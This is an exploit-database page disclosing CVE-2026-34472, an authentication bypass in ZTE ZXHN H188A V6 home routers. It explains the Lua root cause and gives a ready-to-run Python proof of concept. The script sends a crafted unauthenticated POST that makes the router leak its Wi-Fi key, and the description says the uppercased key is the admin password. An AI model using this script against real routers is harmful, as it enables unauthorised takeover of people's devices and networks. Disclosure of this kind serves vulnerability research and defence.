---
title: ZTE ZXHN H188A V6 Authentication Bypass
url: https://cxsecurity.com/issue/WLB-2026060008
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-06-15
fetch_date: 2026-06-16T07:14:40.083524
---

# ZTE ZXHN H188A V6 Authentication Bypass

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ZTE ZXHN H188A V6 Authentication Bypass** **2026.06.15**  Credit:  **[Mina Nageh Salalma](https://cxsecurity.com/author/Mina%2BNageh%2BSalalma/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-34472](https://cxsecurity.com/cveshow/CVE-2026-34472/ "Click to see CVE-2026-34472")**  CWE: **N/A** | |

# Exploit Title: ZTE ZXHN H188A V6 - Authentication Bypass
# Date: 2026-05-20
# Exploit Author: Mina Nageh Salalma (Monx Research)
# Vendor Homepage: https://www.zte.com.cn
# Software Link:
https://github.com/minanagehsalalma/cve-2026-34472-auth-bypass-zte-h188a-router
# Version: ZXHN H188A V6.0.10P2\_TE, V6.0.10P3N3\_TE
# Tested on: ZTE ZXHN H188A V6.0.10P2\_TE
# CVE: CVE-2026-34472
# Description:
# Unauthenticated requests to the root path of ZTE ZXHN H188A V6 firmware
# can reach pre-login wizard handlers and disclose WLAN PSKs, SSIDs, and
# PPPoE usernames. The leaked Wi-Fi password is also the default
administrator
# password after uppercasing, resulting in full authentication bypass.
#
# Root cause: router\_logic\_impl.lua accepts \_type and \_tag directly for
# empty-path requests. urlpath\_2type\_modifier.lua only applies
QuickSetupEnable
# when \_type is missing. Wizard handlers then expose credential-bearing read
# actions (getPassword, wlan\_get, ppp\_get) for unauthenticated users.
#
# Approximately 500 publicly exposed H188A interfaces were reachable at
# time of original report (May 2024). ZTE PSIRT stopped responding; CVE
# assigned by MITRE on 2026-03-27 after escalation.
#
# MITRE CVE: https://www.cve.org/CVERecord?id=CVE-2026-34472
# PoC - Trigger wizard credential endpoint (Python 3 / requests)
import requests
import sys
def exploit(target):
url = f"http://{target}/"
# Craft request with \_type parameter to bypass QuickSetupEnable gate
params = {"\_type": "loginData", "\_tag": "login\_entry"}
headers = {"Content-Type": "application/x-www-form-urlencoded"}
data = {"IF\_ACTION": "getPassword", "\_InstID\_PASS":
"DEV.WIFI.AP1.PSK1", "PASSTYPE": "PSK"}
try:
r = requests.post(url, params=params, headers=headers, data=data,
timeout=10, verify=False)
print(f"[+] {target} HTTP {r.status\_code}")
print(r.text[:2000])
except Exception as e:
print(f"[-] {target}: {e}")
if \_\_name\_\_ == "\_\_main\_\_":
if len(sys.argv) < 2:
print("Usage: poc.py <target\_ip>")
sys.exit(1)
exploit(sys.argv[1])

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026060008)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top